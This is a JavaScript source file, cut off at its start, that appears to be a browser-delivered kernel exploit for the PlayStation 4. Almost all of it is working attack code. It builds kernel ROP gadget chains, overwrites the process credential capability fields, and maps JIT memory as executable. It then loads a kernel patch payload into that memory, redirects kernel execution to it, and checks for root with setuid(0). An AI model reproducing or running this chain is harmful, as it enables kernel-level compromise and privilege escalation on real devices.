    kchain.push_get_retval();

    kchain.push_restore();

    push_ret_einval(kchain);

    push_krop_end(kchain);

    chain.syscall('fchmod', sd, mmap_area);
    kchain.clean();

    return kchain.return_value;
}

function get_jit_capabilities(kchain, sd, mmap_area, ucred_addr) {
    const chain = new Chain();
    // struct ucred has been customized for the ps4
    //
    // See
    // OpenOrbis/mira-project/external/freebsd-headers/include/sys/ucred.h
    // at https://github.com for the definition.
    //
    // Credits to CelesteBlue and Cryptogenic for telling which cr_sceCaps[x]
    // to modify. Da Puppeh for the definition of ucred.
    const p_ucred = ucred_addr;

    // cr_sceCaps[0]
    kchain.push_write64(p_ucred.add(0x60), new Int(-1));
    // cr_sceCaps[1]
    kchain.push_write64(p_ucred.add(0x68), new Int(-1));

    push_ret_einval(kchain);

    push_krop_end(kchain);

    chain.syscall('fchmod', sd, mmap_area);
    kchain.clean();
}

async function kexec_payload(kchain, sd, mmap_area, scratch) {
    const chain = new Chain();
    const map_size = 0x100000;
    // PROT_READ | PROT_WRITE | PROT_EXEC
    const prot_rwx = 7;
    // PROT_READ | PROT_EXEC
    const prot_rx = 5;
    // PROT_READ | PROT_WRITE
    const prot_rw = 3;
    const map_shared = 1;

    const exec_handle = chain.syscall('jitshm_create', 0, map_size, prot_rwx);

    const write_handle = chain.syscall('jitshm_alias', exec_handle, prot_rw);

    const exec_addr = new Addr(
        chain.syscall(
            'mmap',
            '0x900000000',
            map_size,
            prot_rx,
            map_shared,
            exec_handle,
            0,
        )
    );

    const write_addr = new Addr(
        chain.syscall(
            'mmap',
            '0x910000000',
            map_size,
            prot_rw,
            map_shared,
            write_handle,
            0,
        )
    );

    debug_log(`exec_addr: ${exec_addr}`);
    debug_log(`write_addr: ${write_addr}`);
    if (!exec_addr.eq('0x900000000') && !write_addr.eq('0x910000000')) {
        die('mmap() for jit failed');
    }

    // mov eax, 0x1337; ret
    const test_code = new Int('0xc300001337b8');

    write_addr.write64(0, test_code);
    alert('test jit exec');
    let retval = chain.call(exec_addr);
    alert('returned successfully');

    debug_log(`jit retval: ${retval}`);
    if (!retval.eq(0x1337)) {
        die('test jit exec failed');
    }

    const buf = await get_patches('./kpatch/80x.elf');
    // start of loadable segments is at offset 0x1000
    const patches = new Uint8Array(buf, 0x1000);

    if (patches.length > map_size) {
        die(`patch file too large (>${$map_size}): ${patches.length}`);
    }

    // copy the file to executable memory
    mem.set_addr(write_addr);
    mem.worker.set(patches);

    // Modify the stack frame so that we jump to exec_addr with interrupts
    // enabled and rsp is a kernel address.
    kchain.push_save();

    // scratch[0] = rbp
    kchain.push_gadget('xchg rbp, rax; ret');
    kchain.push_gadget('pop rdi; ret');
    kchain.push_value(scratch);
    kchain.push_gadget('mov qword ptr [rdi], rax; ret');

    // scratch[8] = old_rbp
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');
    kchain.push_gadget('pop rdi; ret');
    kchain.push_value(scratch.add(8));
    kchain.push_gadget('mov qword ptr [rdi], rax; ret');

    // rax = rbp
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(scratch);
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');

    // rax -= 8
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(-8);
    kchain.push_gadget('add rax, rdx; ret');

    // scratch[0x10] = rbp - 8
    kchain.push_gadget('pop rdi; ret');
    kchain.push_value(scratch.add(0x10));
    kchain.push_gadget('mov qword ptr [rdi], rax; ret');

    // rdx = rbp - 8
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(scratch.add(0x10));
    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');

    // rax = old_rbp
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(scratch.add(8));
    kchain.push_gadget('mov rax, qword ptr [rax]; ret');

    // *(rbp - 8) = old_rbp
    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');

    // rdx = rbp
    kchain.push_gadget('pop rcx; ret');
    kchain.push_value(scratch);
    kchain.push_gadget('mov rdx, qword ptr [rcx]; ret');

    // *rbp = exec_addr
    kchain.push_gadget('pop rax; ret');
    kchain.push_value(exec_addr);
    kchain.push_gadget('mov qword ptr [rdx], rax; mov al, 1; ret');

    kchain.push_restore();

    // rbp -= 8
    kchain.push_gadget('xchg rbp, rax; ret');
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(-8);
    kchain.push_gadget('add rax, rdx; ret');
    kchain.push_gadget('xchg rbp, rax; ret');

    // have the payload return EINVAL for us, read push_ret_einval() for why
    const EINVAL = 22;
    // kpatch(kbase, EINVAL, NULL)
    kchain.push_gadget('pop rdi; ret');
    kchain.push_value(kbase);
    kchain.push_gadget('pop rsi; ret');
    kchain.push_constant(EINVAL);
    kchain.push_gadget('pop rdx; ret');
    kchain.push_constant(0);

    push_krop_end(kchain);

    chain.syscall('mlock', exec_addr, map_size);

    alert('test jit kexec');
    chain.syscall('fchmod', sd, mmap_area);
    kchain.clean();

    retval = chain.syscall('setuid', 0);
    debug_log(`setuid(): ${retval}`);
    if (!retval.eq(0)) {
        die('kpatch() failed');
    }
    debug_log('kernel exploit succeeded!');
}

async function get_patches(url) {
    const response = await fetch(url);

    if (!response.ok) {
        throw Error(
            `Network response was not OK, status: ${response.status}\n`
            + `failed to fetch: ${url}`
        );
    }

    return await response.arrayBuffer();
}

async function kexploit() {
    init(Chain);
    const kchain = new Chain();

    mlock_gadgets(gadgets);
    mlock_kchain(kchain);
    const [
        mmap_area,
        mmap_area_size,
        jop_buffer,
        rax_ptrs,
        scratch,
    ] = prepare_knote(kchain);
    const [sd, kretval] = trigger_oob(kchain);

    // offset relative to kernel base
    const offset_k_socketops_fo_chmod = 0x1a76060;
    kbase = kretval.sub(offset_k_socketops_fo_chmod);
    debug_log(`kbase: ${kbase}`);

    // setup for fchmod() kernel ROP chain
    mmap_area.write64(8, jop_buffer);
    rax_ptrs.write64(0x70, kchain.get_gadget(jop2));

    const p_ucred = get_ucred_addr(kchain, sd, mmap_area);
    debug_log(`p_ucred: ${p_ucred}`);

    get_jit_capabilities(kchain, sd, mmap_area, p_ucred);
    await kexec_payload(kchain, sd, mmap_area, scratch);
}

kexploit();
